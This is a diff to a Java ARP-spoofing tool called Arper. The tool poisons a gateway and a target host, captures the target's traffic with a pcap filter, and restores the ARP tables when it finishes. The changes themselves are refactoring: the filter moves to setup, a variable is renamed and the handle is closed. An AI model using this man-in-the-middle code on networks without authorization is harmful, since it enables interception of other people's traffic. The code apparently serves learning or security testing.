@@ -52,21 +52,21 @@ public class Arper {
     public void run() {
         PcapNetworkInterface nif = NetworkUtils.selectNetWorkInterface();
         Sniff sniff = new Sniff(nif);
-
+        sniff.setFilter("dst host " + targetIP);
         while (true) {
             try {
                 poison(gatewayIP, targetIP);
 
-                Packet p = sniff.captureFilteredPacket("dst host " + targetIP);
+                Packet p = sniff.capturePacket();
                 System.out.println(p);
             } catch (Exception e) {
                 e.printStackTrace();
                 break;
-
             }
 
         }
 
+        sniff.closeHandle();
         System.out.println("Restoring...\n");
         restore(gatewayIP, targetIP);
 
@@ -114,13 +114,13 @@ public class Arper {
             handle.setFilter("arp and src host " + targetIP,
                     BpfCompileMode.OPTIMIZE);
 
-            EthernetPacket target = buildArpPacket(
+            EthernetPacket arpPckt = buildArpPacket(
                     attackerIP,
                     attackerMac,
                     targetIP,
                     MacAddress.ETHER_BROADCAST_ADDRESS);
 
-            handle.sendPacket(target);
+            handle.sendPacket(arpPckt);
             Utils.sleep(1000);
 
             PcapPacket frame = handle.getNextPacketEx();
